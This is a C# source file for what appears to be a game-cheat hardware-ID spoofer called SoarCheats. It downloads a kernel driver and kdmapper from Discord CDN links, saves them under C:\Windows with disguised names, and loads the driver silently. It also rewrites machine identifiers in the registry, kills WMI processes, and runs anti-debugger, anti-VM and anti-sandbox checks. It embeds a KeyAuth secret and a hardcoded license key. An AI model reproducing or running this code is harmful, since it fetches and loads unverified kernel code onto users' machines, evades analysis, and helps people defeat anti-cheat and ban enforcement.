using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using KeyAuth;
using Microsoft.Win32;

namespace PrecisionBuildOne
{
    class Program
    {

        public static api soarcheats = new api(
            name: "kepo",
            ownerid: "RAVsVxYVUg",
            secret: "048a2c3a67d9ed5a1a91f0eaa567fc59763793d141b1da30dc8a30a2138ec0a0",
            version: "1.0"
        );


        private static readonly string _allowedCharacters = "ABCDEFGHIJKLMNOPQRSTUVWXZabcdfghjklmnpqrstvxz0123456789";

        public static string RandomChar(int numberOfCharacters)
        {
            const int from = 0;
            int to = _allowedCharacters.Length;
            Random r = new Random();

            StringBuilder qs = new StringBuilder();
            for (int i = 0; i < numberOfCharacters; i++)
            {
                qs.Append(_allowedCharacters.Substring(r.Next(from, to), 1));
            }
            return qs.ToString();
        }
        static void titleshit()
        {
            while (true)
            {
                Console.Title = RandomChar(10) + " / pasted by Cozmic";
                Thread.Sleep(500);
            }

        }

        static void ProtectionStruct()
        {
            while (true)
            {
                if (SoarProtect.IsDebuggerActive())
                    //Environment.Exit(0);

                if (SoarProtect.EmulatonCheck())
                    Environment.Exit(0);

                if (SoarProtect.CheckVM())
                    Environment.Exit(0);

                if (SoarProtect.SandBoxDetection())
                    Environment.Exit(0);

                Thread.Sleep(300);
            }
        }



        static void Memory()
        {
            SoarProtect.MemoryDumpProtection();
        }

        static void WriteLine(string arg)
        {
            Console.Write("    [");
            Console.ForegroundColor = ConsoleColor.DarkBlue;
            Console.Write("+");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("] ");
            for (int i = 0; i < arg.Length; i++)
            {
                Console.Write(arg[i]);
                Thread.Sleep(20);
            }
            Console.WriteLine();
        }
        static void Write(string arg)
        {
            Console.Write("    [");
            Console.ForegroundColor = ConsoleColor.DarkBlue;
            Console.Write("+");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("] ");
            for (int i = 0; i < arg.Length; i++)
            {
                Console.Write(arg[i]);
                Thread.Sleep(20);
            }
        }

        public static string RandomNumId(int length)
        {
            string chars = "0123456789";
            string result = "";
            Random random = new Random();

            for (int i = 0; i < length; i++)
            {
                result += chars[random.Next(chars.Length)];
            }

            return result;
        }


        static int RandomDisplayId()
        {
            Random rnd = new Random();
            return rnd.Next(1, 9);
        }

        static void qīpiànxìngSMBIOS()
        {
            Thread.Sleep(300);
            using (RegistryKey smbiosData = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true))
            {
                if (smbiosData != null)
                {
                    string serialNumberBefore = smbiosData.GetValue("SystemSerialNumber")?.ToString();

                    string newSerialNumber = RandomNumId(10);
                    smbiosData.SetValue("SystemSerialNumber", newSerialNumber);
                }
            }
            try
            {
                using (RegistryKey HardwareGUID = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001", true))
                {
                    if (HardwareGUID != null)
                    {
                        string logBefore = "HwProfileGuid - Before: " + HardwareGUID.GetValue("HwProfileGuid");
                        HardwareGUID.DeleteValue("HwProfileGuid");
                        HardwareGUID.SetValue("HwProfileGuid", Guid.NewGuid().ToString());
                        string logAfter = "HwProfileGuid - After: " + HardwareGUID.GetValue("HwProfileGuid");
                    }
                    else
                    {
                        return;
                    }
                }
                Thread.Sleep(1000);

                Thread.Sleep(100);
                using (RegistryKey MachineGUID = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Cryptography", true))
                {
                    if (MachineGUID != null)
                    {
                        string logBefore = "MachineGuid - Before: " + MachineGUID.GetValue("MachineGuid");
                        MachineGUID.DeleteValue("MachineGuid");
                        MachineGUID.SetValue("MachineGuid", Guid.NewGuid().ToString());
                        string logAfter = "MachineGuid - After: " + MachineGUID.GetValue("MachineGuid");
                    }
                    else
                    {
                        return;
                    }
                }

                Thread.Sleep(200);
                using (RegistryKey MachineId = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\SQMClient", true))
                {
                    if (MachineId != null)
                    {
                        string logBefore = "MachineId - Before: " + MachineId.GetValue("MachineId");
                        MachineId.DeleteValue("MachineId");
                        MachineId.SetValue("MachineId", Guid.NewGuid().ToString());
                        string logAfter = "MachineId - After: " + MachineId.GetValue("MachineId");
                    }
                    else
                    {
                        return;
                    }
                }

                using (RegistryKey SystemInfo = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SystemInformation", true))
                {
                    if (SystemInfo != null)
                    {
                        Random rnd = new Random();
                        int day = rnd.Next(1, 31);
                        string dayStr = (day < 10) ? $"0{day}" : day.ToString();
                        int month = rnd.Next(1, 13);
                        string monthStr = (month < 10) ? $"0{month}" : month.ToString();
                        int year = rnd.Next(1990, 2023);
                        string yearStr = year.ToString();
                        string randomDate = $"{monthStr}/{dayStr}/{yearStr}";
                        SystemInfo.SetValue("BIOSReleaseDate", randomDate);

                    }
                    else
                    {

                        return;
                    }
                }


            }
            catch (Exception ex)
            {

            }
            try
            {

                string originalName;
                string newName = RandomNumId(8);
                using (RegistryKey computerNameKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", true))
                {
                    if (computerNameKey != null)
                    {
                        originalName = computerNameKey.GetValue("ComputerName").ToString();

                        computerNameKey.SetValue("ComputerName", newName);
                        computerNameKey.SetValue("ActiveComputerName", newName);
                        computerNameKey.SetValue("ComputerNamePhysicalDnsDomain", "");
                    }
                    else
                    {
                        return;
                    }
                }
                using (RegistryKey activeComputerNameKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true))
                {
                    if (activeComputerNameKey != null)
                    {
                        activeComputerNameKey.SetValue("ComputerName", newName);
                        activeComputerNameKey.SetValue("ActiveComputerName", newName);
                        activeComputerNameKey.SetValue("ComputerNamePhysicalDnsDomain", "");
                    }
                    else
                    {
                        return;
                    }
                }
                Thread.Sleep(2000);
                using (RegistryKey hostnameKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", true))
                {
                    if (hostnameKey != null)
                    {
                        hostnameKey.SetValue("Hostname", newName);
                        hostnameKey.SetValue("NV Hostname", newName);
                    }
                    else
                    {
                        return;
                    }
                }
                using (RegistryKey interfacesKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces", true))
                {
                    if (interfacesKey != null)
                    {
                        foreach (string interfaceName in interfacesKey.GetSubKeyNames())
                        {
                            using (RegistryKey interfaceKey = interfacesKey.OpenSubKey(interfaceName, true))
                            {
                                if (interfaceKey != null)
                                {
                                    interfaceKey.SetValue("Hostname", newName);
                                    interfaceKey.SetValue("NV Hostname", newName);
                                }
                            }
                        }
                    }
                }
                string logBefore = "ComputerName - Before: " + originalName;
                string logAfter = "ComputerName - After: " + newName;



            }
            catch (Exception ex)
            {

            }
            try
            {

                Thread.Sleep(700);
                RegistryKey displaySettings = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", true);

                if (displaySettings != null)
                {
                    string originalDisplayId = displaySettings.GetValue("MRU0")?.ToString();
                    int displayId = RandomDisplayId();
                    string spoofedDisplayId = $"SpoofedDisplay{displayId}";

                    displaySettings.SetValue("MRU0", spoofedDisplayId);
                    displaySettings.SetValue("MRU1", spoofedDisplayId);
                    displaySettings.SetValue("MRU2", spoofedDisplayId);
                    displaySettings.SetValue("MRU3", spoofedDisplayId);
                    displaySettings.SetValue("MRU4", spoofedDisplayId);

                    string logBefore = "Display ID - Before: " + originalDisplayId;
                    string logAfter = "Display ID - After: " + displayId;



                }
                else
                {

                }

            }
            catch (Exception ex)
            {

            }
            try
            {
                Thread.Sleep(900);
                using (RegistryKey efiVariables = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Nsi\\{eb004a03-9b1a-11d4-9123-0050047759bc}\\26", true))
                {
                    if (efiVariables != null)
                    {
                        string efiVariableIdBefore = efiVariables.GetValue("VariableId")?.ToString();

                        string newEfiVariableId = Guid.NewGuid().ToString();
                        efiVariables.SetValue("VariableId", newEfiVariableId);

                    }
                }
            }
            catch (Exception ex)
            {
            }
        }

        static void OperatingID()
        {
            Thread.Sleep(2000);
            RegistryKey localMachine64 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
            RegistryKey myKey = localMachine64.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion", true);
            if (myKey != null)
            {
                myKey.SetValue("ProductId", "00" + RandomNumId(3) + "-" + RandomNumId(1) + "0000-" + "00000-" + RandomNumId(5), RegistryValueKind.String);
                myKey.Close();
            }
        }

        static void qīpiàncípán()
        {
            string text6 = @"C:\Windows\PREFETCH.EXE-IU14D2N.TMP-" + RandomChar(10) + ".sys";
            WebClient wb = new WebClient();
            File.WriteAllBytes(text6, wb.DownloadData("https://cdn.discordapp.com/attachments/1191414157459853473/1191414172265762918/soardrv.sys"));
            File.WriteAllBytes(@"C:\Windows\runtimedotnet.exe", wb.DownloadData("https://cdn.discordapp.com/attachments/1191414157459853473/1191414187197485126/kdmapper.exe"));
            Process.Start(new ProcessStartInfo
            {
                FileName = @"C:\Windows\runtimedotnet.exe",
                Arguments = text6,
                UseShellExecute = false,
                CreateNoWindow = true
            }).WaitForExit();
            File.Delete(text6);
            File.Delete(@"C:\Windows\runtimedotnet.exe");
        }

        static void menu()
        {
            Console.Clear();
            Console.WriteLine();
            Write("Spoof ? (Y/N) -> ");
            string lol = Console.ReadLine();
            if (lol == "Y" || lol == "y")
            {
                qīpiàncípán();
                qīpiànxìngSMBIOS();
                OperatingID();
                WriteLine("Successfully Spoofed.");
                Thread.Sleep(2000);
            }

            Write("Refresh WMI ? (Y/N) -> ");
            string lol2 = Console.ReadLine();
            if (lol2 == "Y" || lol == "y")
            {
                foreach (Process p in Process.GetProcessesByName("WmiPrvSE"))
                {
                    p.Kill();
                }
            }

            Thread.Sleep(2000);
            WriteLine("All Operations Complete, Ready for playing.");
            Thread.Sleep(-1);
        }
        static void _Main()
        {
            Console.Clear();
            Console.WriteLine();
            Write("License Key : ");
            string lol = Console.ReadLine();

            if (lol == "CozmicIsSoCool")
                {
                WriteLine("Valid license.");
                Thread.Sleep(2000);
                menu();
            }
            else
            {
                WriteLine("Invalid License.");
                Thread.Sleep(2000);
                _Main();
            }
        }
        static void Main(string[] args)
        {
            Console.WindowHeight = 18;
            Console.WindowWidth = 64;
            soarcheats.init();
            Thread soarprotect = new Thread(ProtectionStruct);
            soarprotect.Start();
            Thread title = new Thread(titleshit);
            title.Start();
            Thread mem = new Thread(Memory);
            mem.Start();
            SoarProtect.AntiDump();
            _Main();
        }
    }
}
